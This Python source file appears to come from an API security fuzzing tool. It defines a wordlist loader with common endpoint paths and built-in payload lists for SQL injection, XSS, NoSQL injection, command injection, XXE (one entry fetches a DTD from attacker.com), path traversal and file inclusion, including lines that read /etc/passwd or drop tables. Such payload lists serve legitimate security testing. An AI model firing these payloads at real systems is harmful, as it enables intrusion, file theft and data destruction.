"""Wordlist loader for endpoint discovery with SecLists support."""

from pathlib import Path
from typing import List, Optional
import gzip
import logging

logger = logging.getLogger(__name__)


class WordlistLoader:
    """Load and manage wordlists for fuzzing with SecLists integration."""

    # Default wordlist embedded
    DEFAULT_ENDPOINTS = [
        # Common REST endpoints
        "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5",
        "/users", "/user", "/profile", "/me", "/account",
        "/posts", "/post", "/articles", "/article", "/news",
        "/products", "/product", "/items", "/item", "/catalog",
        "/admin", "/administrator", "/config", "/configuration", "/settings",
        "/auth", "/login", "/logout", "/register", "/signin", "/signup",
        "/data", "/list", "/get", "/create", "/update", "/delete", "/patch",
        "/search", "/query", "/filter", "/sort", "/find",
        "/upload", "/download", "/export", "/import", "/backup",
        "/status", "/health", "/ping", "/version", "/about",
        "/swagger", "/swagger.json", "/openapi.json", "/docs/swagger.json",
        "/docs", "/documentation", "/help", "/api-docs", "/api/docs",
        "/debug", "/test", "/sandbox", "/testing",
        "/webhook", "/webhooks", "/callback", "/event", "/hook",
        "/graphql", "/.graphql", "/graphql/", "/api/graphql",
        "/soap", "/webservice", "/ws", "/service",
        # API paths
        "/api/users/list", "/api/users/create", "/api/users/update", "/api/users/delete",
        "/api/admin/users", "/api/admin/settings", "/api/admin/dashboard",
        "/api/public", "/api/private", "/api/protected",
        "/api/internal", "/api/external", "/api/third-party",
        # REST conventions
        "/rest", "/rest/api", "/restapi",
        "/v1", "/v2", "/v3",
        "/backend", "/application", "/service",
        # Common microservice paths
        "/actuator", "/metrics", "/info",
        "/management", "/manage",
    ]

    def __init__(self, custom_wordlist: Optional[str] = None, use_seclists: bool = False):
        """
        Initialize wordlist loader.

        Args:
            custom_wordlist: Path to custom wordlist file
            use_seclists: Whether to integrate SecLists loader
        """
        self.custom_wordlist = custom_wordlist
        self.wordlist = self.DEFAULT_ENDPOINTS.copy()
        self.use_seclists = use_seclists
        self.seclists_loader = None

        if use_seclists:
            try:
                from .seclists_loader import SecListsLoader
                self.seclists_loader = SecListsLoader()
            except Exception as e:
                logger.warning(f"Could not initialize SecLists loader: {str(e)}")

        if custom_wordlist:
            self._load_custom(custom_wordlist)

    def _load_custom(self, path: str):
        """Load custom wordlist from file."""
        try:
            file_path = Path(path)

            if not file_path.exists():
                raise FileNotFoundError(f"Wordlist file not found: {path}")

            # Handle gzipped files
            if path.endswith('.gz'):
                with gzip.open(file_path, 'rt') as f:
                    lines = f.readlines()
            else:
                with open(file_path, 'r') as f:
                    lines = f.readlines()

            # Clean and add lines
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    self.wordlist.append(line)

        except Exception as e:
            raise RuntimeError(f"Error loading custom wordlist: {str(e)}")

    def get_endpoints(self, limit: Optional[int] = None) -> List[str]:
        """
        Get list of endpoints.

        Args:
            limit: Maximum number of endpoints to return

        Returns:
            List of endpoints
        """
        wordlist = self.wordlist

        if limit:
            return wordlist[:limit]

        return wordlist

    def get_parameters(self) -> List[str]:
        """Get common parameter names for fuzzing."""
        return [
            "id", "user_id", "product_id", "item_id",
            "page", "limit", "offset", "sort",
            "query", "q", "search", "filter",
            "admin", "debug", "test", "token",
            "api_key", "key", "secret", "password",
            "username", "email", "role", "permission",
        ]

    def get_payloads(self, payload_type: str) -> List[str]:
        """Get payloads for specific vulnerability type (enhanced)."""
        payloads = {
            "sqli": [
                # Union-based
                "' UNION SELECT NULL,NULL,NULL --",
                "' UNION SELECT username, password FROM users --",
                "1' UNION ALL SELECT NULL,NULL,NULL,NULL --",
                # Boolean-based
                "' OR '1'='1",
                "' OR 1=1 --",
                "' OR 'a'='a",
                "admin' --",
                "admin' #",
                "admin' /*",
                # Time-based blind
                "'; WAITFOR DELAY '00:00:05' --",
                "' AND SLEEP(5) --",
                "' AND BENCHMARK(5000000,SHA1('test')) --",
                # Error-based
                "' AND extractvalue(1, concat(0x7e, (SELECT version()))) --",
                "' AND updatexml(1,concat(0x7e,(SELECT version())),1) --",
                # Classic payloads
                "1; DROP TABLE users --",
                "'; DROP TABLE users --",
                "1' OR '1'='1",
            ],
            "xss": [
                # Script-based
                "<script>alert('xss')</script>",
                "<script>alert(document.domain)</script>",
                "<script src='javascript:alert(1)'></script>",
                # Event-based
                "\"><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<img src=x onerror=\"alert('xss')\">",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe onload=alert(1)>",
                # Attribute-based
                "javascript:alert(1)",
                "javascript:alert(document.cookie)",
                # Modern payloads
                "<svg/onload=alert(1)>",
                "<img/src=\"x\"/onerror=alert(1)>",
                "<iframe src='javascript:alert(1)'>",
                "<marquee onstart=alert(1)>",
            ],
            "nosqli": [
                # Operator injection
                "{\"$ne\": null}",
                "{\"$ne\": false}",
                "{\"$gt\": \"\"}",
                "{\"$regex\": \".*\"}",
                "{\"$where\": \"1==1\"}",
                # String injection
                "'; return true; //",
                "'; return 1; //",
                # Advanced
                "{\"$or\": [{\"a\": 1}]}",
                "{\"$or\": [{\"$ne\": null}]}",
            ],
            "command_injection": [
                # Unix/Linux
                "; whoami",
                "| whoami",
                "& whoami",
                "` whoami `",
                "$(whoami)",
                "; id",
                "| id",
                "|| id",
                "& id",
                "; cat /etc/passwd",
                # Windows
                "& whoami",
                "| whoami",
                "; dir",
                "& dir",
                "| type c:\\windows\\win.ini",
            ],
            "xxe": [
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><lolz>&lol2;</lolz>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://attacker.com/xxe.dtd\"><foo/>",
            ],
            "path_traversal": [
                "../",
                "../../",
                "../../../",
                "../../../../",
                "../../../../../",
                "..\\",
                "..\\..\\",
                "..%2f",
                "..%252f",
                "%2e%2e%2f",
                "....//",
                "....\\\\",
                "..%c0%af",
            ],
            "lfi": [
                "/etc/passwd",
                "file:///etc/passwd",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "php://expect://id",
                "data://text/plain,<?php phpinfo();?>",
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
            ],
        }

        return payloads.get(payload_type, [])

    def load_from_seclists(self, category: str, name: str, merge: bool = True) -> List[str]:
        """
        Load wordlist from SecLists.

        Args:
            category: Category ('discovery', 'payloads', 'fuzzing')
            name: Wordlist name
            merge: Whether to merge with default wordlist

        Returns:
            List of wordlist entries
        """
        if not self.seclists_loader:
            logger.warning("SecLists loader not initialized")
            return self.wordlist if merge else []

        try:
            entries = self.seclists_loader.load_wordlist(category, name, merge_default=False)
            if merge:
                # Combine with defaults, removing duplicates
                combined = list(set(self.wordlist + entries))
                return combined
            return entries
        except Exception as e:
            logger.error(f"Error loading SecLists wordlist: {str(e)}")
            return self.wordlist if merge else []

    def get_seclists_available(self) -> dict:
        """Get available SecLists wordlists."""
        if not self.seclists_loader:
            return {}
        return self.seclists_loader.get_available_wordlists()
